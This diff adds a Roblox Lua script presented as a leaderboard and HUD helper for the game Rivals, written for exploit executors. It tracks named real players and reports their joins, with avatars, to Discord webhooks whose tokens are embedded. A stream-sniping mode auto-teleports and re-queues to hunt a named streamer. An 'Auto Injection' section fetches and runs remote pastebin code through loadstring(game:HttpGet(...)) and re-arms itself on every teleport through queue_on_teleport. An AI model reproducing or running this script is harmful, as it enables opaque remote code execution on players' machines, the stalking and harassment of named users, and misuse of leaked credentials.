@@ -1,0 +1,859 @@
+-- 📌 Rivals Assistant (Fixed: uses real ELO/Level/WinStreak + ranks + draggable/resizable HUD & Leaderboard)
+wait(2)
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local UserInputService = game:GetService("UserInputService")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+---------------------------------------------------------------------
+-- 🔧 CONFIG (unchanged)
+---------------------------------------------------------------------
+local TARGET_PLAYERS = { "don_iie","MarcoXDDDDDD","illac17","XportNz","failedloadinguser",
+   "Realinq","Simark72","ILove_YukkiAsuna","61Q_Fr0st","Riptide_Fr0st",
+    "kentfla","mrmatash","Pyrixl","LeFouTrolleur","SStormix","Gleamier",
+    "IronedIron","LiamGame09","ForgedMoney","julythird73" }
+
+local PRIORITY_PLAYERS = { "Realinq", "Simark72" }
+local STREAMER_NAME = "MyStreamerFriend"
+local STREAM_SNIPER_MODE = false
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1418569124132556851/pzHrMO332nwGYhV58q-chPxHqDDMN6B53nlZi203NN5jEU4N7jNYRyE3Bgzyo5c2Bcbr"
+
+-- ───────────── NEW: Whitelist config ─────────────
+-- Add player names here to hide them completely from the leaderboard.
+-- Example: local WHITELIST_PLAYERS = { "YourAlt1", "YourAlt2" }
+local WHITELIST_PLAYERS = { "11110110000", "YourAlt2" }
+---------------------------------------------------------------------
+
+---------------------------------------------------------------------
+-- 🎵 Sounds (unchanged)
+---------------------------------------------------------------------
+local NORMAL_SOUND = "rbxassetid://6534947240"
+local PRIORITY_SOUND = "rbxassetid://12222005" -- short beep
+local STREAK_SOUND = "rbxassetid://138201977" -- optional streak sound
+
+---------------------------------------------------------------------
+-- 🔔 Popup Notification (unchanged)
+---------------------------------------------------------------------
+local function createPopup(title, color, soundId, duration, avatar)
+	local gui = Instance.new("ScreenGui")
+	gui.ResetOnSpawn = false
+	gui.Parent = PlayerGui
+
+	local frame = Instance.new("Frame")
+	frame.Size = UDim2.new(0, 360, 0, 70)
+	frame.Position = UDim2.new(0.5, -180, 0.05, -80)
+	frame.BackgroundColor3 = color
+	frame.BackgroundTransparency = 0.15
+	frame.BorderSizePixel = 0
+	frame.Parent = gui
+
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0, 10)
+	corner.Parent = frame
+
+	if avatar then
+		local img = Instance.new("ImageLabel")
+		img.Size = UDim2.new(0, 50, 0, 50)
+		img.Position = UDim2.new(0, 10, 0.5, -25)
+		img.BackgroundTransparency = 1
+		img.Image = avatar
+		img.Parent = frame
+	end
+
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(1, -70, 1, -10)
+	label.Position = UDim2.new(0, 65, 0, 5)
+	label.BackgroundTransparency = 1
+	label.TextColor3 = Color3.new(1,1,1)
+	label.Font = Enum.Font.GothamBold
+	label.TextScaled = true
+	label.Text = title
+	label.TextXAlignment = Enum.TextXAlignment.Left
+	label.Parent = frame
+
+	local sound = Instance.new("Sound")
+	sound.SoundId = soundId
+	sound.Volume = 2
+	sound.Parent = frame
+	pcall(function() sound:Play() end)
+
+	frame:TweenPosition(UDim2.new(0.5, -180, 0.05, 0),
+		Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.3, true)
+
+	task.delay(duration or 3, function()
+		frame:TweenPosition(UDim2.new(0.5, -180, 0.05, -80),
+			Enum.EasingDirection.In, Enum.EasingStyle.Back, 0.3, true)
+		task.wait(0.4)
+		gui:Destroy()
+	end)
+end
+
+---------------------------------------------------------------------
+-- 🌐 Webhook (unchanged)
+---------------------------------------------------------------------
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1419222098500653117/qsip-4-wGZCVesO8-RkJZIUMHFf486XKjXncYr_WToGXwJluex7-KGUGJg1zxCVkSXmE" -- make sure you set this
+local ROLE_ID = "1419222148802809978"    -- replace with your Discord role ID
+
+local function sendWebhook(player, isPriority)
+    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
+
+    local userId = player.UserId
+    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=100&height=100&format=png"
+
+    local content = "<@&"..ROLE_ID.."> " -- 👈 this pings the role
+
+    local data = {
+        content = content,
+        username = "Rivals Assistant",
+        avatar_url = "https://i.imgur.com/oBPXx0D.png", -- webhook bot’s avatar
+        embeds = {{
+            title = isPriority and "🔥 PRIORITY Player Found!" or "⚔ Player Found",
+            description = player.Name.." has joined your server!",
+            color = isPriority and 16711680 or 3447003, -- red if priority, blue otherwise
+            thumbnail = { url = avatarUrl }, -- ✅ player’s Roblox avatar
+            footer = { text = "Rivals Assistant" },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    local headers = { ["Content-Type"] = "application/json" }
+    local finalData = HttpService:JSONEncode(data)
+
+    -- Works in exploit environments & studio
+    if syn and syn.request then
+        syn.request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = headers,
+            Body = finalData
+        })
+    elseif http_request then
+        http_request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = headers,
+            Body = finalData
+        })
+    else
+        HttpService:PostAsync(WEBHOOK_URL, finalData, Enum.HttpContentType.ApplicationJson)
+    end
+end
+
+
+---------------------------------------------------------------------
+-- 🎯 Player Alerts (unchanged)
+---------------------------------------------------------------------
+local function notifyPlayerJoined(player)
+	if table.find(PRIORITY_PLAYERS, player.Name) then
+		local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=100&height=100&format=png"
+		createPopup("🔥 PRIORITY: "..player.Name.." joined!", Color3.fromRGB(120,0,0), PRIORITY_SOUND, 4, avatar)
+		sendWebhook(player,true)
+	elseif table.find(TARGET_PLAYERS, player.Name) then
+		local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=100&height=100&format=png"
+		createPopup("⚠️ ALERT: "..player.Name.." joined!", Color3.fromRGB(25,25,25), NORMAL_SOUND, 3, avatar)
+		sendWebhook(player,false)
+	end
+end
+
+Players.PlayerAdded:Connect(notifyPlayerJoined)
+for _, p in ipairs(Players:GetPlayers()) do
+	notifyPlayerJoined(p)
+end
+
+---------------------------------------------------------------------
+-- 🏆 Leaderboard (always visible)  <- ONLY THIS SECTION WAS UPDATED
+-- Added: rank color mapping, name shortening, draggable + resizable board, both-keybind toggle
+---------------------------------------------------------------------
+local screen = Instance.new("ScreenGui")
+screen.Name = "RivalsLeaderboard"
+screen.ResetOnSpawn = false
+screen.IgnoreGuiInset = true
+screen.DisplayOrder = 999999
+screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screen.Parent = PlayerGui
+
+local board = Instance.new("Frame")
+board.Name = "RivalsBoard"
+board.Size = UDim2.new(0, 360, 0, 300) -- slightly taller for resizer
+board.Position = UDim2.new(1, -380, 0, 60)
+board.BackgroundColor3 = Color3.fromRGB(25,25,25)
+board.BackgroundTransparency = 0.15
+board.BorderSizePixel = 0
+board.Parent = screen
+
+local outline = Instance.new("UIStroke")
+outline.Thickness = 2
+outline.Color = Color3.fromRGB(25,25,40)
+outline.Parent = board
+
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1, 0, 0, 36)
+header.BackgroundColor3 = Color3.fromRGB(35,35,35)
+header.BorderSizePixel = 0
+header.Parent = board
+
+local headerLabel = Instance.new("TextLabel")
+headerLabel.Size = UDim2.new(1, 0, 1, 0)
+headerLabel.BackgroundTransparency = 1
+headerLabel.Font = Enum.Font.GothamBold
+headerLabel.TextSize = 16
+headerLabel.TextColor3 = Color3.new(1,1,1)
+headerLabel.Text = "⚔ Rivals Leaderboard"
+headerLabel.Parent = header
+
+local listFrame = Instance.new("ScrollingFrame")
+listFrame.Name = "ListFrame"
+listFrame.Size = UDim2.new(1, -10, 1, -46)
+listFrame.Position = UDim2.new(0, 5, 0, 40)
+listFrame.BackgroundTransparency = 1
+listFrame.ScrollBarThickness = 6
+listFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+listFrame.Parent = board
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0, 4)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = listFrame
+
+local rowRefs = {}
+
+-- rank color mapping (user-specified ranks only)
+local RankColorMap = {
+	Bronze = Color3.fromRGB(205,127,50),
+	Silver = Color3.fromRGB(192,192,192),
+	Gold = Color3.fromRGB(255,215,0),
+	Platinum = Color3.fromRGB(175,238,238),
+	Diamond = Color3.fromRGB(0,191,255),
+	Onyx = Color3.fromRGB(85,0,128),
+	Nemesis = Color3.fromRGB(255,69,0),
+	Archnemesis = Color3.fromRGB(255,0,0)
+}
+
+local function getRankFromElo(elo)
+	if not elo then return "Bronze" end
+	elo = tonumber(elo) or 0
+	-- map to the limited set requested (Bronze, Silver, Gold, Platinum, Diamond, Onyx, Nemesis, Archnemesis)
+	if elo >= 6000 then return "Archnemesis" end
+	if elo >= 3600 then return "Nemesis" end
+	if elo >= 3000 then return "Onyx" end
+	if elo >= 2400 then return "Diamond" end
+	if elo >= 1800 then return "Platinum" end
+	if elo >= 1200 then return "Gold" end
+	if elo >= 600 then return "Silver" end
+	return "Bronze"
+end
+
+-- robust getters: try leaderstats children first, then player Attributes (covers both server designs)
+local function getPlayerElo(p)
+	-- try leaderstats children (common)
+	if p:FindFirstChild("leaderstats") then
+		local ls = p.leaderstats
+		local candidate = ls:FindFirstChild("ELO") or ls:FindFirstChild("Elo") or ls:FindFirstChild("DisplayELO")
+		if candidate and candidate.Value ~= nil then
+			return tonumber(candidate.Value) or 0
+		end
+	end
+	-- try attributes
+	local attrNames = {"DisplayELO","ELO","Elo","elo","displayELO"}
+	for _, name in ipairs(attrNames) do
+		local a = p:GetAttribute(name)
+		if a ~= nil then
+			return tonumber(a) or 0
+		end
+	end
+	-- fallback: maybe a stat named "Elo" is elsewhere; try FindFirstChild recursively (last resort)
+	-- we avoid guessing; return 0
+	return 0
+end
+
+local function getPlayerLevel(p)
+	if p:FindFirstChild("leaderstats") then
+		local lv = p.leaderstats:FindFirstChild("Level") or p.leaderstats:FindFirstChild("level")
+		if lv and lv.Value ~= nil then return tonumber(lv.Value) or 0 end
+	end
+	local attrs = {"Level","level"}
+	for _,n in ipairs(attrs) do
+		local a = p:GetAttribute(n)
+		if a ~= nil then return tonumber(a) or 0 end
+	end
+	return 0
+end
+
+local function getPlayerStreak(p)
+	if p:FindFirstChild("leaderstats") then
+		local ws = p.leaderstats:FindFirstChild("Win Streak") or p.leaderstats:FindFirstChild("WinStreak") or p.leaderstats:FindFirstChild("StatisticDuelsWinStreak")
+		if ws and ws.Value ~= nil then return tonumber(ws.Value) or 0 end
+	end
+	local attrs = {"StatisticDuelsWinStreak","Win Streak","WinStreak","StatisticDuelsWins"}
+	for _,n in ipairs(attrs) do
+		local a = p:GetAttribute(n)
+		if a ~= nil then return tonumber(a) or 0 end
+	end
+	return 0
+end
+
+-- shorten name helper
+local function shortName(name, maxLen)
+	maxLen = maxLen or 12
+	if #name <= maxLen then return name end
+	return string.sub(name,1,maxLen-1) .. "…"
+end
+
+local function rankColorString(rank)
+	local c = RankColorMap[rank] or Color3.new(1,1,1)
+	return string.format("rgb(%d,%d,%d)", math.floor(c.R*255), math.floor(c.G*255), math.floor(c.B*255))
+end
+
+local function eloColorByRank(rank)
+	-- returns a RGB string to be used in richtext
+	return rankColorString(rank)
+end
+
+local function refreshBoard()
+	-- gather entries using robust getters (will use real ELO if present)
+	local entries = {}
+	for _, p in ipairs(Players:GetPlayers()) do
+		-- ───────────── NEW: skip whitelist players ─────────────
+		if not table.find(WHITELIST_PLAYERS, p.Name) then
+			local elo = getPlayerElo(p)
+			local level = getPlayerLevel(p)
+			local streak = getPlayerStreak(p)
+			-- include players if any stat is present (keeps behavior like before)
+			-- If you want to show everyone regardless, you can remove the conditional.
+			if level ~= 0 or streak ~= 0 or elo ~= 0 or p.Name == LocalPlayer.Name then
+				local rank = getRankFromElo(elo)
+				table.insert(entries, {
+					name = p.Name,
+					streak = streak,
+					level = level,
+					elo = elo,
+					rank = rank
+				})
+			end
+		end
+	end
+
+	-- sort by ELO (primary), Level (secondary), WinStreak (tertiary)
+	table.sort(entries, function(a,b)
+		if a.elo == b.elo then
+			if a.level == b.level then
+				return a.streak > b.streak
+			else
+				return a.level > b.level
+			end
+		else
+			return a.elo > b.elo
+		end
+	end)
+
+	-- create/update rows (keeps your previous UI layout)
+	for i, e in ipairs(entries) do
+		local row = rowRefs[i]
+		if not row then
+			row = Instance.new("TextLabel")
+			row.Size = UDim2.new(1, -8, 0, 22)
+			row.Position = UDim2.new(0,4,0,(i-1)*26 + 2)
+			row.BackgroundTransparency = 1
+			row.Font = Enum.Font.GothamSemibold
+			row.TextSize = 14
+			row.TextXAlignment = Enum.TextXAlignment.Left
+			row.TextColor3 = Color3.fromRGB(230,230,230)
+			row.RichText = true
+			row.Parent = listFrame
+			rowRefs[i] = row
+		end
+
+		local placeColor = "rgb(230,230,230)"
+		if i == 1 then placeColor = "rgb(255,215,0)"
+		elseif i == 2 then placeColor = "rgb(192,192,192)"
+		elseif i == 3 then placeColor = "rgb(205,127,50)"
+		end
+
+		local streakColor = e.streak > 0 and "rgb(100,255,100)" or "rgb(255,100,100)"
+
+		-- show shortened name and colour-coded ELO based on rank
+		local short = shortName(e.name, 12)
+		local eloColor = eloColorByRank(e.rank)
+		row.Text = string.format(
+			"<font color='%s'>#%d</font> [Lvl %s] %s | <font color='%s'>WS: %s</font> | <font color='%s'>ELO: %d (%s)</font>",
+			placeColor, i, tostring(e.level), short, streakColor, tostring(e.streak), eloColor, e.elo, e.rank
+		)
+	end
+
+	-- remove old extra rows
+	for j = #entries+1, #rowRefs do
+		if rowRefs[j] then
+			rowRefs[j]:Destroy()
+			rowRefs[j] = nil
+		end
+	end
+
+	listFrame.CanvasSize = UDim2.new(0,0,0, math.max(0, #entries * 26))
+end
+
+task.spawn(function()
+	while screen.Parent do
+		-- wrap refresh in pcall to avoid a single error killing the loop
+		local ok, err = pcall(refreshBoard)
+		if not ok then
+			warn("[RivalsLeaderboard] refreshBoard error:", err)
+		end
+		task.wait(4)
+	end
+end)
+---------------------------------------------------------------------
+-- 📊 HUD Panel (toggleable with F4) - expanded + draggable + resizable
+---------------------------------------------------------------------
+local hud = Instance.new("ScreenGui")
+hud.Name = "RivalsHUD"
+hud.ResetOnSpawn = false
+hud.Parent = PlayerGui
+hud.Enabled = false
+
+local frame = Instance.new("Frame")
+frame.Name = "RivalsHUDFrame"
+frame.Size = UDim2.new(0, 260, 0, 140)
+frame.Position = UDim2.new(0, 20, 0.65, 0)
+frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+frame.BackgroundTransparency = 0.15
+frame.BorderSizePixel = 0
+frame.Parent = hud
+
+local uiCorner = Instance.new("UICorner", frame)
+
+local titleBar = Instance.new("Frame", frame)
+titleBar.Name = "TitleBar"
+titleBar.Size = UDim2.new(1,0,0,28)
+titleBar.Position = UDim2.new(0,0,0,0)
+titleBar.BackgroundColor3 = Color3.fromRGB(35,35,35)
+titleBar.BorderSizePixel = 0
+
+local titleLabel = Instance.new("TextLabel", titleBar)
+titleLabel.Size = UDim2.new(1, -8, 1, 0)
+titleLabel.Position = UDim2.new(0, 8, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 14
+titleLabel.TextColor3 = Color3.fromRGB(255,255,255)
+titleLabel.Text = "Rivals HUD"
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Stats inside HUD
+local fpsLabel = Instance.new("TextLabel")
+fpsLabel.Name = "FPSLabel"
+fpsLabel.Size = UDim2.new(1, -12, 0, 20)
+fpsLabel.Position = UDim2.new(0,6,0,34)
+fpsLabel.BackgroundTransparency = 1
+fpsLabel.TextColor3 = Color3.fromRGB(255,255,255)
+fpsLabel.Font = Enum.Font.GothamBold
+fpsLabel.TextSize = 14
+fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
+fpsLabel.Parent = frame
+
+local pingLabel = fpsLabel:Clone()
+pingLabel.Name = "PingLabel"
+pingLabel.Position = UDim2.new(0,6,0,58)
+pingLabel.Parent = frame
+
+local queueLabel = fpsLabel:Clone()
+queueLabel.Name = "QueueLabel"
+queueLabel.Position = UDim2.new(0,6,0,82)
+queueLabel.Parent = frame
+
+local wlLabel = fpsLabel:Clone()
+wlLabel.Name = "WLLabel"
+wlLabel.Position = UDim2.new(0,6,0,106)
+wlLabel.Parent = frame
+
+-- Resizer (bottom-right corner) for HUD
+local resizer = Instance.new("Frame")
+resizer.Name = "Resizer"
+resizer.Size = UDim2.new(0, 14, 0, 14)
+resizer.Position = UDim2.new(1, -16, 1, -16)
+resizer.BackgroundColor3 = Color3.fromRGB(60,60,60)
+resizer.BorderSizePixel = 0
+resizer.Parent = frame
+
+local resizerCorner = Instance.new("UICorner")
+resizerCorner.CornerRadius = UDim.new(0,4)
+resizerCorner.Parent = resizer
+
+-- FPS / Ping updater
+local frames, last = 0, tick()
+RunService.RenderStepped:Connect(function()
+	frames = frames + 1
+	if tick()-last >= 1 then
+		fpsLabel.Text = "FPS: "..frames
+		frames = 0
+		last = tick()
+	end
+	local ok, ping = pcall(function()
+		return math.floor(Players.LocalPlayer:GetNetworkPing()*1000)
+	end)
+	if ok and ping then
+		pingLabel.Text = "Ping: "..ping.."ms"
+	else
+		pingLabel.Text = "Ping: -"
+	end
+end)
+
+-- Queue timer
+local inQueue, queueStart = false, 0
+local function startQueue() inQueue = true queueStart = tick() end
+local function stopQueue() inQueue = false end
+RunService.Heartbeat:Connect(function()
+	if inQueue then
+		local elapsed = tick()-queueStart
+		queueLabel.Text = string.format("Queue: %ds", math.floor(elapsed))
+
+		-- [NEW] auto-cancel queue after 60s when stream snipe mode active
+		if STREAM_SNIPER_MODE and elapsed >= 60 then
+			createPopup("⏱ Queue auto-cancel after 60s", Color3.fromRGB(100,100,255), NORMAL_SOUND, 3)
+			stopQueue()
+			pcall(function()
+				TeleportService:Teleport(game.PlaceId, LocalPlayer)
+			end)
+		end
+	else
+		queueLabel.Text = "Queue: -"
+	end
+end)
+
+local wins, losses = 0,0
+local function updateWL()
+	wlLabel.Text = "W: "..wins.." | L: "..losses.." | Ratio: "..(losses>0 and string.format("%.2f",wins/losses) or tostring(wins))
+end
+updateWL()
+
+---------------------------------------------------------------------
+-- 🎮 Stream Sniper Mode (unchanged)
+---------------------------------------------------------------------
+if STREAM_SNIPER_MODE then
+	Players.PlayerAdded:Connect(function(p)
+		if p.Name == STREAMER_NAME then
+			createPopup("🎥 Streamer "..p.Name.." found! Stay in queue!", Color3.fromRGB(0,120,255), NORMAL_SOUND, 4)
+		end
+	end)
+
+	task.spawn(function()
+		while task.wait(5) do
+			if not Players:FindFirstChild(STREAMER_NAME) then
+				createPopup("🚪 Leaving... Streamer not here.", Color3.fromRGB(60,60,60), NORMAL_SOUND, 3)
+				pcall(function()
+					TeleportService:Teleport(game.PlaceId, LocalPlayer)
+				end)
+			end
+		end
+	end)
+end
+
+---------------------------------------------------------------------
+-- 🚀 Auto Injection System
+-------------------------------------------------------------
+local function autoInject()
+	local success, err = pcall(function()
+		-- Check if we're in the right game environment
+		if not game:GetService("Players").LocalPlayer then
+			return false
+		end
+		
+		-- Verify required services exist
+		local requiredServices = {"UserInputService", "Players", "ReplicatedStorage"}
+		for _, serviceName in ipairs(requiredServices) do
+			if not game:GetService(serviceName) then
+				return false
+			end
+		end
+		
+		return true
+	end)
+	
+	if success and err then
+		print("✅ Auto-injection successful")
+		return true
+	else
+		warn("❌ Auto-injection failed:", err or "Environment check failed")
+		return false
+	end
+end
+
+-- Auto-inject on script load
+if not autoInject() then
+	script:Destroy()
+	return
+end
+
+-------------------------------------------------------------
+-- 🚀 Auto Injection System
+-------------------------------------------------------------
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+
+-- Auto-execute on teleport/game join
+TeleportService.TeleportInitFailed:Connect(function()
+	task.wait(2)
+	loadstring(game:HttpGet("https://pastebin.com/raw/JvwhBqge"))()
+end)
+
+Players.LocalPlayer.OnTeleport:Connect(function()
+	queue_on_teleport('loadstring(game:HttpGet("https://pastebin.com/raw/JvwhBqge"))()') 
+end)
+
+-------------------------------------------------------------
+-- ⌨️ Keybinds (UPDATED: both F4 and End toggle HUD + Leaderboard)
+---------------------------------------------------------------------
+-- Old behavior: End cleared PlayerGui — replaced with toggle to match F4
+UserInputService.InputBegan:Connect(function(input, gpe)
+	if gpe then return end
+	if input.KeyCode == Enum.KeyCode.F4 or input.KeyCode == Enum.KeyCode.End then
+		hud.Enabled = not hud.Enabled
+		screen.Enabled = not screen.Enabled
+	end
+end)
+
+---------------------------------------------------------------------
+-- NEW: make a frame draggable
+---------------------------------------------------------------------
+local function makeDraggable(frame)
+	local dragging, dragInput, dragStart, startPos
+
+	local function update(input)
+		local delta = input.Position - dragStart
+		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+
+	frame.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 then
+			dragging = true
+			dragStart = input.Position
+			startPos = { X = frame.Position.X, Y = frame.Position.Y }
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	frame.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement then
+			dragInput = input
+		end
+	end)
+
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			pcall(update, input)
+		end
+	end)
+end
+
+---------------------------------------------------------------------
+-- NEW: make a frame resizable (bottom-right corner)
+---------------------------------------------------------------------
+local function makeResizable(container, handle)
+	-- container: Frame to resize (UDim2 sizing with pixel offsets)
+	-- handle: small frame in bottom-right to drag
+	local resizing = false
+	local startSize, startPos, startMouse
+
+	handle.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 then
+			resizing = true
+			startMouse = input.Position
+			startSize = { X = container.Size.X.Offset, Y = container.Size.Y.Offset }
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					resizing = false
+				end
+			end)
+		end
+	end)
+
+	handle.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement then
+			startMouse = input.Position
+		end
+	end)
+
+	UserInputService.InputChanged:Connect(function(input)
+		if not resizing then return end
+		if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
+
+		local delta = input.Position - startMouse
+		local newX = math.clamp(startSize.X + delta.X, 120, math.floor(math.max(200, workspace.CurrentCamera.ViewportSize.X - 40)))
+		local newY = math.clamp(startSize.Y + delta.Y, 80, math.floor(math.max(120, workspace.CurrentCamera.ViewportSize.Y - 40)))
+		container.Size = UDim2.new(0, newX, 0, newY)
+	end)
+end
+
+-- Make board draggable and resizable
+makeDraggable(board)
+-- Add resizer for board
+local boardResizer = Instance.new("Frame")
+boardResizer.Name = "BoardResizer"
+boardResizer.Size = UDim2.new(0, 16, 0, 16)
+boardResizer.Position = UDim2.new(1, -18, 1, -18)
+boardResizer.BackgroundColor3 = Color3.fromRGB(50,50,50)
+boardResizer.BorderSizePixel = 0
+boardResizer.Parent = board
+local brCorner = Instance.new("UICorner", boardResizer)
+brCorner.CornerRadius = UDim.new(0,4)
+makeResizable(board, boardResizer)
+
+-- Make HUD draggable and resizable (using the resizer element already created)
+makeDraggable(frame)
+makeResizable(frame, resizer)
+
+---------------------------------------------------------------------
+-- [NEW] Streak hunters check (1000+ only)
+---------------------------------------------------------------------
+local function checkStreakHunters(player)
+	if not player or not player.Parent then return end
+
+	local streakVal = getPlayerStreak(player)
+	if streakVal >= 1000 then
+		local ok, err = pcall(function()
+			createPopup("🔥 STREAKHUNTER: "..tostring(player.Name).." ("..tostring(streakVal).." WS)", Color3.fromRGB(255,128,0), STREAK_SOUND, 5)
+		end)
+		if not ok then
+			warn("[STREAKHUNTERS] createPopup failed:", err)
+		end
+	end
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+	pcall(checkStreakHunters, p)
+end
+Players.PlayerAdded:Connect(function(p)
+	pcall(checkStreakHunters, p)
+end)
+
+---------------------------------------------------------------------
+-- ───────────── NEW: Stream Sniper Auto-Queue / Leave / Requeue System ─────────────
+-- This section augments stream-snipe behavior: auto-join Play -> AUTO_MODE,
+-- starts queue timer state, leaves queue when streamer not present / target detected / timeout,
+-- and requeues automatically. Uses "X" as the queue cancel button (as requested).
+---------------------------------------------------------------------
+do
+	-- Config for auto-queue behavior (tweak these)
+	local AUTO_MODE = "1v1"        -- mode button name to click
+	local MAX_QUEUE_WAIT = 60     -- seconds to wait before leaving & requeue
+	local REQUEUE_DELAY = 1.2     -- small delay before rejoining
+
+	-- local state
+	local autoQueueRunning = false
+
+	-- helper: safe activate a button
+	local function clickButton(btn)
+		if not btn then return end
+		if btn:IsA("TextButton") or btn:IsA("ImageButton") then
+			pcall(function() btn:Activate() end)
+		else
+			-- try firing MouseButton1Click if needed
+			pcall(function() btn:FireServer() end)
+		end
+	end
+
+	-- join queue: clicks Play then mode (if GUIs exist)
+	local function joinQueueAuto()
+		-- try to find Play GUI and press Play -> AUTO_MODE
+		local playGui = PlayerGui:FindFirstChild("PlayGui", true) or PlayerGui:FindFirstChild("Play", true) and PlayerGui
+		if playGui then
+			local playBtn = playGui:FindFirstChild("Play", true)
+			if playBtn then
+				clickButton(playBtn)
+				task.wait(0.25)
+			end
+
+			-- try find mode button (search recursively)
+			local modeBtn = playGui:FindFirstChild(AUTO_MODE, true)
+			if modeBtn then
+				clickButton(modeBtn)
+				-- start queue state (uses your existing startQueue())
+				pcall(startQueue)
+				createPopup("🔁 Auto-queue: "..AUTO_MODE, Color3.fromRGB(80,120,255), NORMAL_SOUND, 3)
+			end
+		end
+	end
+
+	-- leave queue and optionally requeue (uses "X" button in QueueGui)
+	local function leaveQueueAuto(reason, doRequeue)
+		local qGui = PlayerGui:FindFirstChild("QueueGui", true)
+		if qGui then
+			local xBtn = qGui:FindFirstChild("X", true) or qGui:FindFirstChild("Close", true) or qGui:FindFirstChild("Cancel", true)
+			if xBtn then
+				clickButton(xBtn)
+			end
+		end
+		-- stop queue state
+		pcall(stopQueue)
+		createPopup("🚪 Auto-left queue: "..tostring(reason), Color3.fromRGB(200,60,60), NORMAL_SOUND, 3)
+		if doRequeue then
+			task.wait(REQUEUE_DELAY)
+			joinQueueAuto()
+		end
+	end
+
+	-- monitor: leave on timeout/targets/streamer not present
+	task.spawn(function()
+		-- set flag to allow loop to run only if stream sniper mode enabled
+		autoQueueRunning = true
+		while autoQueueRunning do
+			if STREAM_SNIPER_MODE then
+				-- leave on timeout
+				if inQueue and (tick() - queueStart >= MAX_QUEUE_WAIT) then
+					leaveQueueAuto("timeout > "..tostring(MAX_QUEUE_WAIT).."s", true)
+				end
+
+				-- leave if a target / priority shows up
+				if inQueue then
+					for _, pl in ipairs(Players:GetPlayers()) do
+						if table.find(TARGET_PLAYERS, pl.Name) or table.find(PRIORITY_PLAYERS, pl.Name) then
+							leaveQueueAuto("detected "..pl.Name, true)
+							break
+						end
+					end
+				end
+
+				-- leave / requeue if streamer not present (you requested leave if not found)
+				if inQueue and not Players:FindFirstChild(STREAMER_NAME) then
+					leaveQueueAuto("streamer not present", true)
+				end
+
+				-- if not in queue, keep trying to join (auto queue behavior)
+				if not inQueue then
+					-- attempt to join queue
+					joinQueueAuto()
+				end
+			else
+				-- if streamer mode turned off, stop auto-queue loop until turned on again
+				task.wait(1)
+			end
+			task.wait(0.6)
+		end
+	end)
+
+	-- attempt initial join only if stream-sniper mode on
+	if STREAM_SNIPER_MODE then
+		joinQueueAuto()
+	end
+end
+---------------------------------------------------------------------
+-- End of Stream Sniper Auto-Queue section
+---------------------------------------------------------------------
+
+---------------------------------------------------------------------
+-- Keep the rest of the script behavior (no shortening) - autosync refresh loop already added above
+---------------------------------------------------------------------
+
+-- Ensure screen/hud initial enabled state
+screen.Enabled = true
+hud.Enabled = true
+
+-- End of script
